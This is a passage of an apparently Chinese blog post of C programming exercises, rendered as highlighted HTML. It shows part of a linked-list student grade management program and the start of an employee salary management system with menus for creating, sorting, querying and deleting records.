class="built_in">printf</span>(<span class="string">&quot;找不到该信息\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(v==<span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入分数：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;fs);</span><br><span class="line"><span class="keyword">for</span>(p=h-&gt;next;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;cj[<span class="number">0</span>]&gt;=fs)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld %s %0.lf\n&quot;</span>,p-&gt;xh,p-&gt;xm,p-&gt;cj[<span class="number">0</span>]);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;人数%d\n&quot;</span>,count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(v==<span class="number">4</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入分数：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;fs);</span><br><span class="line"><span class="keyword">for</span>(p=h-&gt;next;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;cj[<span class="number">1</span>]&gt;=fs)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld %s %0.lf\n&quot;</span>,p-&gt;xh,p-&gt;xm,p-&gt;cj[<span class="number">1</span>]);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%人数d\n&quot;</span>,count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(v==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入总分：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;fs);</span><br><span class="line"><span class="keyword">for</span>(p=h-&gt;next;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;cj[<span class="number">1</span>]+p-&gt;cj[<span class="number">0</span>]&gt;=fs)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld %s %0.lf %0.lf\n&quot;</span>,p-&gt;xh,p-&gt;xm,p-&gt;cj[<span class="number">0</span>],p-&gt;cj[<span class="number">1</span>]);</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%人数d\n&quot;</span>,count);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">h</span>=</span><span class="literal">NULL</span>,*p1,*p2,*p;</span><br><span class="line"><span class="type">int</span> n,v;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1．新建数据\n2．添加数据\n3．删除数据\n4．排序\n5．查询\n6．退出屏幕提示：请输入序号选择相应操作:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">while</span>(n!=<span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">p1=(<span class="keyword">struct</span> student*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> student));</span><br><span class="line">h=chuanjiang(h,p1);</span><br><span class="line">zs++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;添加到第几位？&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v); </span><br><span class="line">p1=(<span class="keyword">struct</span> student*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> student));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入数据&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld %s %lf %lf&quot;</span>,&amp;p1-&gt;xh,p1-&gt;xm,&amp;p1-&gt;cj[<span class="number">0</span>],&amp;p1-&gt;cj[<span class="number">1</span>]);</span><br><span class="line">tianjia(h,p1,v);</span><br><span class="line">zs++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;删除第几位？&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v); </span><br><span class="line">shanchu(h,v);</span><br><span class="line">zs--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">4</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1．数学成绩排序\n2．程序设计成绩排序\n3．总分排序。\n4．返回主菜单\n请按序号选择相应操作:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v);</span><br><span class="line"><span class="keyword">if</span>(v!=<span class="number">4</span>)&#123;</span><br><span class="line">      maopao(h,v);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1．学号查询\n2．姓名查询\n3．数学成绩查询\n4．程序设计成绩查询\n5．总分查询\n6．返回主菜单\n按序号选择相应操作:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v);</span><br><span class="line"><span class="keyword">if</span>(v!=<span class="number">6</span>)&#123;</span><br><span class="line">chaxun(h,p,v); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1．新建数据\n2．添加数据\n3．删除数据\n4．排序\n5．查询\n6．退出屏幕提示：请输入序号选择相应操作:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="综合训练四：职工工资管理系统"><a href="#综合训练四：职工工资管理系统" class="headerlink" title="综合训练四：职工工资管理系统"></a>综合训练四：职工工资管理系统</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发者：G</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE sizeof(struct person_info)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span>&#123;</span></span><br><span class="line"><span class="type">int</span> id;<span class="comment">//职工号</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">100</span>];<span class="comment">//姓名</span></span><br><span class="line"><span class="type">int</span> sex;<span class="comment">//性别 0-male,1-female</span></span><br><span class="line"><span class="type">char</span> position[<span class="number">100</span>];<span class="comment">//职称</span></span><br><span class="line"><span class="type">float</span> salary_position;<span class="comment">//职务工资</span></span><br><span class="line"><span class="type">float</span> extra_money;<span class="comment">//奖金</span></span><br><span class="line"><span class="type">float</span> water_elec_fee;<span class="comment">//水电费</span></span><br><span class="line"><span class="type">float</span> insur_fee;<span class="comment">//保险费</span></span><br><span class="line"><span class="type">float</span> salary_total;<span class="comment">//实发工资</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">last</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">create</span><span class="params">(<span class="type">int</span> total_num)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_data</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_data</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sort_data</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func6</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">sortID</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">sortTOTALSalary</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">sortsalary_position</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">sortextra_money</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">add</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">int</span> n)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">delete_main</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">delete_id</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">int</span> id)</span>;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">delete_name</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">char</span> name[<span class="number">100</span>])</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">find_main</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span>;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">find_id</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">int</span> id)</span>;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">find_name</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">char</span> name[<span class="number">100</span>])</span>;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">find_posi</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">char</span> posi[<span class="number">100</span>])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show_main_menu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------公司职工工资管理系统----------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|              1.新建                  |\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|              2.显示                  |\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|              3.插入                  |\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|              4.删除                  |\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|              5.查询                  |\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|           6.计算实发工资             |\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|            0.退出本系统              |\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="type">bool</span> choose_correct;<span class="comment">//choose_correct 以防用户输入不合法指令 </span></span><br><span class="line">A:show_main_menu();<span class="comment">//显示开始界面 </span></span><br><span class="line"><span class="type">int</span> user_choose; <span class="comment">// user_choose 记录用户的选择</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择功能对应的序号\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;user_choose);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(user_choose==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您的选择是 %d 新建数据\n&quot;</span>,user_choose);</span><br><span class="line"><span class="type">int</span> total_num;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入公司员工总数：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;total_num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请依次输入%d名员工的信息：职工号、姓名、性别、职称、职务工资、奖金、水电费、保险费\n\n&quot;</span>,total_num);</span><br><span class="line">p=create(total_num);</span><br><span class="line">print_data(p);</span><br><span class="line"><span class="keyword">goto</span> A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(user_choose==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您的选择是 %d 显示数据\n&quot;</span>,user_choose);</span><br><span class="line">print_data(p);</span><br><span class="line"><span class="comment">//当选择显示功能时，用户可以选择按某种排序形式显示，</span></span><br><span class="line"><span class="comment">//如按职工号或姓名的顺序、工资总额的顺序、职务工资或奖金的顺序</span></span><br><span class="line">show_data(p);</span><br><span class="line"><span class="keyword">goto</span> A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(user_choose==<span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您的选择是 %d 计算实发工资\n&quot;</span>,user_choose);</span><br><span class="line">func6(p);</span><br><span class="line"><span class="keyword">goto</span> A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(user_choose==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您的选择是 %d 插入数据\n&quot;</span>,user_choose);</span><br><span class="line"><span class="type">int</span> func3_add; <span class="comment">////记录要添加的人数 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入添加人数：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;func3_add);</span><br><span class="line">p=add(p,func3_add);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;操作成功\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(user_choose==<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您的选择是 %d 删除数据\n&quot;</span>,user_choose);</span><br><span class="line">p=delete_main(p);</span><br><span class="line"><span class="keyword">goto</span> A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(user_choose==<span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您的选择是 %d 查询数据\n&quot;</span>,user_choose);</span><br><span class="line">p=find_main(p);</span><br><span class="line"><span class="keyword">goto</span> A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(user_choose == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您的选择是 %d 退出本系统\n&quot;</span>,user_choose);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;感谢使用本系统,再见\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">create</span><span class="params">(<span class="type">int</span> total_num)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">head</span>,*<span class="title">p</span>,*<span class="title">q</span>;</span></span><br><span class="line">q=p=head=(<span class="keyword">struct</span> person_info*)<span class="built_in">malloc</span>(SIZE);</span><br><span class="line">head-&gt;last=<span class="literal">NULL</span>;</span><br><span class="line"><span 